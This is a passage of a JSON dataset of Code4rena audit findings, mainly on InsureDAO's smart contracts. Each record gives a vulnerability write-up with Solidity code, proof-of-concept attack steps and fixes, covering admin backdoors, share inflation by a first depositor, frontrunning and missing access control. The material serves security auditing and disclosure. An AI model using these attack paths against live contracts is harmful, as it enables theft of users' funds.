      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/271",
      "tags": [
        "Admin"
      ],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1301",
      "title": "[H-08] IndexTemplate.sol#compensate() will most certainly fail",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\n## Root Cause\n\nPrecision loss while converting between `the amount of shares` and `the amount of underlying tokens` back and forth is not handled properly.\n\n---\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L438-L447\n\n```solidity\nuint256 _shortage;\nif (totalLiquidity() < _amount) {\n    //Insolvency case\n    _shortage = _amount - _value;\n    uint256 _cds = ICDSTemplate(registry.getCDS(address(this)))\n        .compensate(_shortage);\n    _compensated = _value + _cds;\n}\nvault.offsetDebt(_compensated, msg.sender);\n```\n\nIn the current implementation, when someone tries to resume the market after a pending period ends by calling `PoolTemplate.sol#resume()`, `IndexTemplate.sol#compensate()` will be called internally to make a payout. If the index pool is unable to cover the compensation, the CDS pool will then be used to cover the shortage.\n\nHowever, while `CDSTemplate.sol#compensate()` takes a parameter for the amount of underlying tokens, it uses `vault.transferValue()` to transfer corresponding `_attributions` (shares) instead of underlying tokens.\n\nDue to precision loss, the `_attributions` transferred in the terms of underlying tokens will most certainly be less than the shortage.\n\nAt L444, the contract believes that it's been compensated for `_value + _cds`, which is lower than the actual value, due to precision loss.\n\nAt L446, when it calls `vault.offsetDebt(_compensated, msg.sender)`, the tx will revert at `require(underlyingValue(msg.sender) >= _amount)`.\n\nAs a result, `resume()` can not be done, and the debt can't be repaid.\n\n### PoC \n\nGiven:\n\n- vault.underlyingValue = 10,000\n- vault.valueAll = 30,000\n- totalAttributions = 2,000,000\n- _amount = 1,010,000\n\n0. _shortage = _amount - vault.underlyingValue = 1,000,000\n1. _attributions = (_amount * totalAttributions) / valueAll = 67,333,333\n2. actualValueTransfered = (valueAll * _attributions) / totalAttributions = 1009999\n\n**Expected results**: actualValueTransfered = _shortage;\n\n**Actual results**: actualValueTransfered < _shortage.\n\n## Impact\n\nThe precision loss isn't just happening on special numbers, but will most certainly always revert the txs.\n\nThis will malfunction the contract as the index pool can not `compensate()`, therefore the pool can not `resume()`. Causing the funds of the LPs of the pool and the index pool to be frozen, and other stakeholders of the same vault will suffer fund loss from an unfair share of the funds compensated before.\n\n## Recommendation\n\nChange to:\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/IndexTemplate.sol#L439-L446\n\n```solidity\nif (totalLiquidity() < _amount) {\n    //Insolvency case\n    _shortage = _amount - _value;\n    uint256 _cds = ICDSTemplate(registry.getCDS(address(this)))\n        .compensate(_shortage);\n    _compensated = vault.underlyingValue(address(this));\n}\nvault.offsetDebt(_compensated, msg.sender);\n```",
      "summary": "\nThis bug report is about an issue with the Precision Loss while converting between the amount of shares and the amount of underlying tokens back and forth in the WatchPug contract. This issue can cause malfunction of the contract, leading to frozen funds of the LPs of the pool and the index pool, and other stakeholders of the same vault suffering fund loss from an unfair share of the funds compensated before.\n\nThe root cause of this issue is that while the CDSTemplate.sol#compensate() takes a parameter for the amount of underlying tokens, it uses vault.transferValue() to transfer corresponding _attributions (shares) instead of underlying tokens. This leads to precision loss, and the _attributions transferred in the terms of underlying tokens will most certainly be less than the shortage. At L444, the contract believes that it's been compensated for _value + _cds, which is lower than the actual value due to precision loss. When it calls vault.offsetDebt(_compensated, msg.sender) at L446, the transaction will revert at require(underlyingValue(msg.sender) >= _amount), and the debt can't be repaid.\n\nThe recommendation to fix this issue is to change the code to the given one, so that the vault.underlyingValue is used instead of the _attributions. This will ensure that the actual value transferred is equal to the shortage, and the transaction will not revert.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/269",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1300",
      "title": "[H-07] Wrong design/implementation of permission control allows malicious/compromised Registry or Factory admin to steal funds from users wallet balances",
      "impact": "HIGH",
      "content": "## Handle\n\nWatchPug\n\n\n## Vulnerability details\n\nThe current design/implementation allows a `market` address (registered on `registry`) to call `Vault#addValue()` and transfer tokens from an arbitrary address to a specified `_beneficiary` up the approved amount at any time, and the `_beneficiary` can withdraw the funds by calling `Vault#withdrawAllAttribution()` immediately.\n\nThis poses a very dangerous risk to all the users that approved their tokens to the Vault contracts (each one holds all users' allowances for that token).\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L52-L58\n\n```solidity=52\nmodifier onlyMarket() {\n    require(\n        IRegistry(registry).isListed(msg.sender),\n        \"ERROR_ONLY_MARKET\"\n    );\n    _;\n}\n```\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L124-L140\n\n```solidity=124\nfunction addValue(\n    uint256 _amount,\n    address _from,\n    address _beneficiary\n) external override onlyMarket returns (uint256 _attributions) {\n\n    if (totalAttributions == 0) {\n        _attributions = _amount;\n    } else {\n        uint256 _pool = valueAll();\n        _attributions = (_amount * totalAttributions) / _pool;\n    }\n    IERC20(token).safeTransferFrom(_from, address(this), _amount);\n    balance += _amount;\n    totalAttributions += _attributions;\n    attributions[_beneficiary] += _attributions;\n}\n```\n\nRegistry owner can call `Registry#supportMarket()` and mark an arbitrary address as a `market`.\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Registry.sol#L49-L60\n\n```solidity=49\nfunction supportMarket(address _market) external override {\n    require(!markets[_market], \"ERROR: ALREADY_REGISTERED\");\n    require(\n        msg.sender == factory || msg.sender == ownership.owner(),\n        \"ERROR: UNAUTHORIZED_CALLER\"\n    );\n    require(_market != address(0), \"ERROR: ZERO_ADDRESS\");\n\n    allMarkets.push(_market);\n    markets[_market] = true;\n    emit NewMarketRegistered(_market);\n}\n```\n\nOr, the owner of the Factory can call `createMarket()` to add a malicous market contract via a custom template contract to the `markets` list.\n\nhttps://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Factory.sol#L214-L216\n\n## PoC\n\nA malicious/compromised Registry owner can:\n\n1. Call `Registry#supportMarket()` and set `markets[attackerAddress]` to `true`;\n2. Call `Vault#addValue(token.balanceOf(victimAddress), victimAddress, attackerAddress)` and transferring all the balanceOf victim's wallet to the vault, owned by `attackerAddress`.\n3. Call `Vault#withdrawAllAttribution(attackerAddress)` and retrive the funds.\n\nThe malicious/compromised Registry owner can repeat the steps above for all the users who approved the Vault contract for all the Vault contracts.\n\nAs a result, the attacker can steal all the wallet balances of the tokens approved to the protocol.\n\n## Root Cause\n\nImproper access control for using users' allowances.\n\n## Recommendation\n\nConsider changing the design/implementation to make sure that the allowances approved by the users can only be used by themselves.",
      "summary": "\nThis bug report is regarding a vulnerability found in the WatchPug application. The current design/implementation allows a market address to call Vault#addValue() and transfer tokens from an arbitrary address to a specified beneficiary up the approved amount at any time, and the beneficiary can withdraw the funds by calling Vault#withdrawAllAttribution() immediately. This poses a very dangerous risk to all the users that approved their tokens to the Vault contracts as a malicious/compromised Registry owner can call Registry#supportMarket() and mark an arbitrary address as a market or the owner of the Factory can call createMarket() to add a malicous market contract via a custom template contract to the markets list. As a result, the attacker can steal all the wallet balances of the tokens approved to the protocol. The root cause of this vulnerability is improper access control for using users' allowances. To fix this issue, it is recommended to change the design/implementation to make sure that the allowances approved by the users can only be used by themselves.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/266",
      "tags": [],
      "finders": [
        "WatchPug"
      ]
    },
    {
      "id": "1299",
      "title": "[H-06] the first depositor to a pool can drain all users",
      "impact": "HIGH",
      "content": "_Submitted by danb_\n\n<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L807>\nif there is no liquidity in the pool, the first deposit determines the total liquidity, if the amount is too small the minted liquidity for the next liquidity providers will round down to zero.\n\n#### Impact\n\nAn attacker can steal all money from liquidity providers.\n\n#### Proof of Concept\n\nconsider the following scenario:\na pool is created.\nthe attacker is the first one to deposit, they deposit with \\_amount == 1, the smallest amount possible. meaning the total liquidity is 1.\nthen they join another pool in order to get attributions in the vault.\nthey transfer the attributions to the pool using `transferAttribution`.\nfor example, they transferred 1M dollar worth of attributions.\nthe next person deposits in the index, for example, 500,000 dollars.\n<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L803>\nthe amount they will get is:\n\n    _amount = (_value * _supply) / _originalLiquidity;\n\nas we know:\n\\_amount = 500,000 dollar\n\\_supply = 1\n\\_totalLiquidity = 1,000,000 dollar (the attacker transferred directly)\nthe investor will get (500,000 dollar \\* 1) / (1,000,000 dollar) = 0\nand they will pay 500,000\nthis money will go to the index, and the attacker holds all of the shares, so they can withdraw it and get 1,500,000 stealing 500,000 dollars from the second investor.\n\n\n**[oishun1112 (Insure) acknowledged and disagreed with severity](https://github.com/code-423n4/2022-01-insure-findings/issues/263):**\n > yes. Every address that has attributions can call transferAttribution(), however, the address has to call addValue() to earn attributions. addValue() has onlyMarket modifier.\n> To pass onlyMarket modifier, ownership has to be stolen, in short.\n> Since we assume ownership control is driven safely, we don't take this as an issue.\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/263#issuecomment-1023330012):**\n > Agree with warden that the privilege addresses should not be able to use approvals in a way that rugs users funds.\n> \n> Based on the fact that we have seen many rug pulls in the space based on compromised \"owner\" keys, this is a valid attack path.\n> \n> `\n> 3  High: Assets can be stolen/lost/compromised directly (or indirectly if there is a valid attack path that does not have hand-wavy hypotheticals).\n> `\n\n\n",
      "summary": "\nA bug report has been filed regarding a vulnerability in the PoolTemplate.sol contract. If there is no liquidity in the pool, the first deposit determines the total liquidity, and if the amount is too small, the minted liquidity for the next liquidity providers will round down to zero. This vulnerability allows an attacker to steal all money from liquidity providers. \n\nA proof of concept was provided to illustrate the vulnerability. In the scenario, a pool is created and the attacker is the first one to deposit an amount of 1, the smallest amount possible. The attacker then joins another pool to get attributions in the vault, transferring 1M dollar worth of attributions to the pool. When the next person deposits 500,000 dollars, the amount they will get is 0, meaning they will pay 500,000 dollars but the money will go to the index, allowing the attacker to withdraw it and get 1,500,000, stealing 500,000 dollars from the second investor.\n\nThe vulnerability was discovered through manual review.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/263",
      "tags": [],
      "finders": [
        "danb"
      ]
    },
    {
      "id": "1298",
      "title": "[H-05] backdoor in withdrawRedundant",
      "impact": "HIGH",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\nThe `Vault.withdrawRedundant` has wrong logic that allows the admins to steal the underlying vault token.\n\n```solidity\nfunction withdrawRedundant(address _token, address _to)\n     external\n     override\n     onlyOwner\n{\n     if (\n          _token == address(token) &&\n          balance < IERC20(token).balanceOf(address(this))\n     ) {\n          uint256 _redundant = IERC20(token).balanceOf(address(this)) -\n               balance;\n          IERC20(token).safeTransfer(_to, _redundant);\n     } else if (IERC20(_token).balanceOf(address(this)) > 0) {\n          // @audit they can rug users. let's say balance == IERC20(token).balanceOf(address(this)) => first if false => transfers out everything\n          IERC20(_token).safeTransfer(\n               _to,\n               IERC20(_token).balanceOf(address(this))\n          );\n     }\n}\n```\n\n#### POC\n- Vault deposits increase as `Vault.addValue` is called and the `balance` increases by `_amount` as well as the actual `IERC20(token).balanceOf(this)`. Note that `balance == IERC20(token).balanceOf(this)`\n- Admins call `vault.withdrawRedundant(vault.token(), attacker)` which goes into the `else if` branch due to the balance inequality condition being `false`. It will transfer out all `vault.token()` amounts to the attacker.\n\n## Impact\nThere's a backdoor in the `withdrawRedundant` that allows admins to steal all user deposits.\n\n## Recommended Mitigation Steps\nI think the devs wanted this logic from the code instead:\n\n```solidity\nfunction withdrawRedundant(address _token, address _to)\n     external\n     override\n     onlyOwner\n{\n     if (\n          _token == address(token)\n     ) {\n          if (balance < IERC20(token).balanceOf(address(this))) {\n               uint256 _redundant = IERC20(token).balanceOf(address(this)) -\n                    balance;\n               IERC20(token).safeTransfer(_to, _redundant);\n          }\n     } else if (IERC20(_token).balanceOf(address(this)) > 0) {\n          IERC20(_token).safeTransfer(\n               _to,\n               IERC20(_token).balanceOf(address(this))\n          );\n     }\n}\n```",
      "summary": "\nA bug report has been submitted by user cmichel for the `Vault.withdrawRedundant` function in a smart contract. This function has a wrong logic that allows the admins to steal the underlying vault token. When the `Vault.addValue` is called, the `balance` increases by `_amount` as well as the actual `IERC20(token).balanceOf(this)`. If the admins call `vault.withdrawRedundant(vault.token(), attacker)`, it will transfer out all `vault.token()` amounts to the attacker due to the balance inequality condition being `false`. This creates a backdoor in the `withdrawRedundant` function that allows admins to steal all user deposits.\n\nThe recommended mitigation step is to change the code to the following:\n\n```solidity\nfunction withdrawRedundant(address _token, address _to)\n     external\n     override\n     onlyOwner\n{\n     if (\n          _token == address(token)\n     ) {\n          if (balance < IERC20(token).balanceOf(address(this))) {\n               uint256 _redundant = IERC20(token).balanceOf(address(this)) -\n                    balance;\n               IERC20(token).safeTransfer(_to, _redundant);\n          }\n     } else if (IERC20(_token).balanceOf(address(this)) > 0) {\n          IERC20(_token).safeTransfer(\n               _to,\n               IERC20(_token).balanceOf(address(this))\n          );\n     }\n}\n```\n\nThis will ensure that the admins cannot steal the underlying vault token and the user deposits will remain secure.",
      "quality_score": 3,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/252",
      "tags": [
        "Admin"
      ],
      "finders": [
        "WatchPug",
        "camden",
        "Ruhum",
        "cmichel"
      ]
    },
    {
      "id": "1297",
      "title": "[H-04] Initial pool deposit can be stolen",
      "impact": "HIGH",
      "content": "_Submitted by cmichel, also found by WatchPug_\n\nNote that the `PoolTemplate.initialize` function, called when creating a market with `Factory.createMarket`, calls a vault function to transfer an initial deposit amount (`conditions[1]`) *from* the initial depositor (`_references[4]`):\n\n```solidity\n// PoolTemplate\nfunction initialize(\n     string calldata _metaData,\n     uint256[] calldata _conditions,\n     address[] calldata _references\n) external override {\n     // ...\n\n     if (_conditions[1] > 0) {\n          // @audit vault calls asset.transferFrom(_references[4], vault, _conditions[1])\n          _depositFrom(_conditions[1], _references[4]);\n     }\n}\n\nfunction _depositFrom(uint256 _amount, address _from)\n     internal\n     returns (uint256 _mintAmount)\n{\n     require(\n          marketStatus == MarketStatus.Trading && paused == false,\n          \"ERROR: DEPOSIT_DISABLED\"\n     );\n     require(_amount > 0, \"ERROR: DEPOSIT_ZERO\");\n\n     _mintAmount = worth(_amount);\n     // @audit vault calls asset.transferFrom(_from, vault, _amount)\n     vault.addValue(_amount, _from, address(this));\n\n     emit Deposit(_from, _amount, _mintAmount);\n\n     //mint iToken\n     _mint(_from, _mintAmount);\n}\n```\n\nThe initial depositor needs to first approve the vault contract for the `transferFrom` to succeed.\n\nAn attacker can then frontrun the `Factory.createMarket` transaction with their own market creation (it does not have access restrictions) and create a market *with different parameters* but still passing in `_conditions[1]=amount` and `_references[4]=victim`.\n\nA market with parameters that the initial depositor did not want (different underlying, old whitelisted registry/parameter contract, etc.) can be created with their tokens and these tokens are essentially lost.\n\n#### Recommended Mitigation Steps\n\nCan the initial depositor be set to `Factory.createMarket`'s `msg.sender`, instead of being able to pick a whitelisted one as `_references[4]`?\n\n**[oishun1112 (Insure) confirmed](https://github.com/code-423n4/2022-01-insure-findings/issues/250):**\n > https://github.com/code-423n4/2022-01-insure-findings/issues/224\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the PoolTemplate.initialize function, which is called when creating a market with Factory.createMarket. This function calls a vault function to transfer an initial deposit amount from the initial depositor, but the initial depositor needs to first approve the vault contract for the transferFrom to succeed. An attacker can then frontrun the Factory.createMarket transaction with their own market creation and create a market with different parameters, but still passing in the same initial deposit amount and initial depositor. This means the initial depositor's tokens are essentially lost, as they can be used to create a market with parameters they did not want.\n\nTo mitigate this vulnerability, it is recommended that the initial depositor be set to Factory.createMarket's msg.sender, instead of being able to pick a whitelisted one as _references[4]. This would prevent the attacker from frontrunning the Factory.createMarket transaction and creating a market with different parameters.",
      "quality_score": 3,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/250",
      "tags": [
        "Front-Running",
        "Initialization"
      ],
      "finders": [
        "WatchPug",
        "cmichel"
      ]
    },
    {
      "id": "1296",
      "title": "[H-03] Malicious Market Creators Can Steal Tokens From Unsuspecting Approved Reference Accounts",
      "impact": "HIGH",
      "content": "_Submitted by leastwood_\n\nThe current method of market creation involves calling `Factory.createMarket()` with a list of approved `_conditions` and `_references` accounts. If a registered template address has `templates[address(_template)].isOpen == true`, then any user is able to call `createMarket()` using this template. If the template points to `PoolTemplate.sol`, then a malicious market creator can abuse `PoolTemplate.initialize()` as it makes a vault deposit from an account that they control. The vulnerable internal function, `_depositFrom()`, makes a vault deposit from the `_references[4]` address (arbitrarily set to an approved reference address upon market creation).\n\nHence, if approved `_references` accounts have set an unlimited approval amount for `Vault.sol` before deploying their market, a malicious user can frontrun market creation and cause these tokens to be transferred to the incorrect market.\n\nThis issue can cause honest market creators to have their tokens transferred to an incorrectly configured market, leading to unrecoverable funds. If their approval to `Vault.sol` was set to the unlimited amount, malicious users will also be able to force honest market creators to transfer more tokens than they would normally want to allow.\n\n#### Proof of Concept\n\n<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/Factory.sol#L158-L231>\n```solidity\nfunction createMarket(\n    IUniversalMarket _template,\n    string memory _metaData,\n    uint256[] memory _conditions,\n    address[] memory _references\n) public override returns (address) {\n    //check eligibility\n    require(\n        templates[address(_template)].approval == true,\n        \"ERROR: UNAUTHORIZED_TEMPLATE\"\n    );\n    if (templates[address(_template)].isOpen == false) {\n        require(\n            ownership.owner() == msg.sender,\n            \"ERROR: UNAUTHORIZED_SENDER\"\n        );\n    }\n    if (_references.length > 0) {\n        for (uint256 i = 0; i < _references.length; i++) {\n            require(\n                reflist[address(_template)][i][_references[i]] == true ||\n                    reflist[address(_template)][i][address(0)] == true,\n                \"ERROR: UNAUTHORIZED_REFERENCE\"\n            );\n        }\n    }\n\n    if (_conditions.length > 0) {\n        for (uint256 i = 0; i < _conditions.length; i++) {\n            if (conditionlist[address(_template)][i] > 0) {\n                _conditions[i] = conditionlist[address(_template)][i];\n            }\n        }\n    }\n\n    if (\n        IRegistry(registry).confirmExistence(\n            address(_template),\n            _references[0]\n        ) == false\n    ) {\n        IRegistry(registry).setExistence(\n            address(_template),\n            _references[0]\n        );\n    } else {\n        if (templates[address(_template)].allowDuplicate == false) {\n            revert(\"ERROR: DUPLICATE_MARKET\");\n        }\n    }\n\n    //create market\n    IUniversalMarket market = IUniversalMarket(\n        _createClone(address(_template))\n    );\n\n    IRegistry(registry).supportMarket(address(market));\n    \n    markets.push(address(market));\n\n\n    //initialize\n    market.initialize(_metaData, _conditions, _references);\n\n    emit MarketCreated(\n        address(market),\n        address(_template),\n        _metaData,\n        _conditions,\n        _references\n    );\n\n    return address(market);\n}\n```\n\n<https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L178-L221>\n```solidity\nfunction initialize(\n    string calldata _metaData,\n    uint256[] calldata _conditions,\n    address[] calldata _references\n) external override {\n    require(\n        initialized == false &&\n            bytes(_metaData).length > 0 &&\n            _references[0] != address(0) &&\n            _references[1] != address(0) &&\n            _references[2] != address(0) &&\n            _references[3] != address(0) &&\n            _references[4] != address(0) &&\n            _conditions[0] <= _conditions[1],\n        \"ERROR: INITIALIZATION_BAD_CONDITIONS\"\n    );\n    initialized = true;\n\n    string memory _name = string(\n        abi.encodePacked(\n            \"InsureDAO-\",\n            IERC20Metadata(_references[1]).name(),\n            \"-PoolInsurance\"\n        )\n    );\n    string memory _symbol = string(\n        abi.encodePacked(\"i-\", IERC20Metadata(_references[1]).symbol())\n    );\n    uint8 _decimals = IERC20Metadata(_references[0]).decimals();\n\n    initializeToken(_name, _symbol, _decimals);\n\n    registry = IRegistry(_references[2]);\n    parameters = IParameters(_references[3]);\n    vault = IVault(parameters.getVault(_references[1]));\n\n    metadata = _metaData;\n\n    marketStatus = MarketStatus.Trading;\n\n    if (_conditions[1] > 0) {\n        _depositFrom(_conditions[1], _references[4]);\n    }\n}\n```\n\n#### Tools Used\n\nManual code review.\nDiscussions with kohshiba.\n\n#### Recommended Mitigation Steps\n\nAfter discussions with the sponsor, they have opted to parse a `_creator` address to `PoolTemplate.sol` which will act as the depositor and be set to `msg.sender` in `Factory.createMarket()`. This will prevent malicious market creators from forcing vault deposits from unsuspecting users who are approved in `Factory.sol` and have also approved `Vault.sol` to make transfers on their behalf.\n\n\n**[oishun1112 (Insure) confirmed](https://github.com/code-423n4/2022-01-insure-findings/issues/224):**\n > https://github.com/code-423n4/2022-01-insure-findings/issues/250\n\n\n",
      "summary": "\nThis bug report describes a vulnerability in the Factory.sol contract, which is used to create markets. If a registered template address has the \"isOpen\" value set to true, any user can call the createMarket() function using this template. If the template points to PoolTemplate.sol, a malicious market creator can abuse the PoolTemplate.initialize() function, as it makes a vault deposit from an account they control. This can cause honest market creators to have their tokens transferred to an incorrectly configured market, leading to unrecoverable funds.\n\nTo mitigate this issue, the sponsor has decided to parse a \"_creator\" address to PoolTemplate.sol, which will act as the depositor and be set to \"msg.sender\" in Factory.createMarket(). This will prevent malicious market creators from forcing vault deposits from unsuspecting users who are approved in Factory.sol and have also approved Vault.sol to make transfers on their behalf.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/224",
      "tags": [],
      "finders": [
        "leastwood"
      ]
    },
    {
      "id": "1295",
      "title": "[H-02] Typo in PoolTemplate unlock function results in user being able to unlock multiple times",
      "impact": "HIGH",
      "content": "_Submitted by loop, also found by p4st13r4 and ye0lde_\n\nThe function `unlock()` in PoolTemplate has a typo where it compares `insurances[_id].status` to `false` rather than setting it to `false`. If the conditions are met to unlock the funds for an id, the user should be able to call the `unlock()` function once for that id as `insurances[_id].amount` is subtracted from `lockedAmount`. However, since `insurances[_id].status` does not get set to `false`, a user can call `unlock()` multiple times for the same id, resulting in `lockedAmount` being way smaller than it should be since `insurances[_id].amount` is subtracted multiple times.\n\n#### Impact\n\n`lockedAmount` is used to calculate the amount of underlying tokens available for withdrawals. If `lockedAmount` is lower than it should be users are able to withdraw more underlying tokens than available for withdrawals.\n\n#### Proof of Concept\n\nTypo in `unlock()`:\n\n*   <https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L360-L362>\n\nCalculation of underlying tokens available for withdrawal:\n\n*   <https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L836>\n\n#### Recommended Mitigation Steps\n\nChange `insurances[_id].status == false;` to `insurances[_id].status = false;`\n\n**[oishun1112 (Insure) confirmed and resolved](https://github.com/code-423n4/2022-01-insure-findings/issues/192):**\n > https://github.com/InsureDAO/pool-contracts/blob/audit/code4rena/contracts/PoolTemplate.sol#L375\n\n**[0xean (judge) commented](https://github.com/code-423n4/2022-01-insure-findings/issues/192#issuecomment-1023658102):**\n > upgrading to sev-3 based on assets being compromised. \n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability found in the function `unlock()` in PoolTemplate. This vulnerability is caused by a typo in the code which compares `insurances[_id].status` to `false` instead of setting it to `false`. This allows a user to call the `unlock()` function multiple times for the same id, resulting in `lockedAmount` being lower than it should be. This means that users are able to withdraw more underlying tokens than available for withdrawals. The proof of concept for this vulnerability can be found in the code at the following links: \n- https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L360-L362\n- https://github.com/code-423n4/2022-01-insure/blob/main/contracts/PoolTemplate.sol#L836\n\nThe recommended mitigation step for this vulnerability is to change `insurances[_id].status == false;` to `insurances[_id].status = false;`.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/192",
      "tags": [],
      "finders": [
        "loop",
        "p4st13r4  ye0lde"
      ]
    },
    {
      "id": "1294",
      "title": "[H-01] Tokens can be burned with no access control",
      "impact": "HIGH",
      "content": "_Submitted by sirhashalot_\n\n\nThe Vault.sol contract has two address state variables, the `keeper` variable and the `controller` variable, which are both permitted to be the zero address. If both variables are zero simultaneously, any address can burn the available funds (available funds = balance - totalDebt) by sending these tokens to the zero address with the unprotected `utilitize()` function. If a user has no totalDebt, the user can lose their entire underlying token balance because of this.\n\n#### Proof of Concept\n\nThe problematic `utilize()` function is [found here](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L342-L352). To see how the two preconditions can occur:\n\n1.  The keeper state variable is only changed by the `setKeeper()` function [found here](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L502). If this function is not called, the keeper variable will retain the default value of address(0), which bypasses [the only access control for the utilize function](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L344).\n2.  There is a comment [here on line 69](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L502https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L502) stating the controller state variable can be zero. There is no zero address check for the controller state variable in the Vault constructor.\n\nIf both address variables are left at their defaults of `address(0)`, then the `safeTransfer()` call [on line 348](https://github.com/code-423n4/2022-01-insure/blob/19d1a7819fe7ce795e6d4814e7ddf8b8e1323df3/contracts/Vault.sol#L348) would send the tokens to address(0).\n\n#### Recommended Mitigation Steps\n\nAdd the following line to the very beginning of the `utilize()` function:\n`require(address(controller) != address(0))`\n\nThis check is already found in many other functions in Vault.sol, including the `_unutilize()` function.\n\n**[oishun1112 (Insure) confirmed and resolved](https://github.com/code-423n4/2022-01-insure-findings/issues/158):**\n > https://github.com/InsureDAO/pool-contracts/blob/audit/code4rena/contracts/Vault.sol#L382\n\n\n\n",
      "summary": "\nThis bug report is about a vulnerability in the Vault.sol contract which allows any address to burn the available funds if both the keeper and controller state variables are set to the zero address. The problematic `utilize()` function is found in the code and can be triggered if the keeper variable is not changed from its default value of address(0) and there is no zero address check for the controller state variable in the Vault constructor. The recommended mitigation step is to add the line `require(address(controller) != address(0))` to the beginning of the `utilize()` function. This check is already found in many other functions in Vault.sol, including the `_unutilize()` function.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "InsureDAO",
      "source_link": "https://code4rena.com/reports/2022-01-insure",
      "github_link": "https://github.com/code-423n4/2022-01-insure-findings/issues/158",
      "tags": [],
      "finders": [
        "sirhashalot"
      ]
    },
    {
      "id": "42320",
      "title": "[M-01] `initialBalance` for native token is wrong",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug, also found by daejunpark, gpersoon, hickuphh3, kenzo, and pmerkleplant_.\n\n<https://github.com/code-423n4/2021-10-slingshot/blob/9c0432cca2e43731d5a0ae9c151dacf7835b8719/contracts/Slingshot.sol#L65-L92>\n\n```solidity\nfunction executeTrades(\n    address fromToken,\n    address toToken,\n    uint256 fromAmount,\n    TradeFormat[] calldata trades,\n    uint256 finalAmountMin,\n    address depricated\n) external nonReentrant payable {\n    depricated;\n    require(finalAmountMin > 0, \"Slingshot: finalAmountMin cannot be zero\");\n    require(trades.length > 0, \"Slingshot: trades cannot be empty\");\n    for(uint256 i = 0; i < trades.length; i++) {\n        // Checks to make sure that module exists and is correct\n        require(moduleRegistry.isModule(trades[i].moduleAddress), \"Slingshot: not a module\");\n    }\n\n    uint256 initialBalance = _getTokenBalance(toToken);\n    _transferFromOrWrap(fromToken, _msgSender(), fromAmount);\n\n    executioner.executeTrades(trades);\n\n    uint finalBalance;\n    if (toToken == nativeToken) {\n        finalBalance = _getTokenBalance(address(wrappedNativeToken));\n    } else {\n        finalBalance = _getTokenBalance(toToken);\n    }\n    uint finalOutputAmount = finalBalance - initialBalance;\n    ...\n```\n\n<https://github.com/code-423n4/2021-10-slingshot/blob/9c0432cca2e43731d5a0ae9c151dacf7835b8719/contracts/Slingshot.sol#L157-L163>\n\n```solidity\nfunction _getTokenBalance(address token) internal 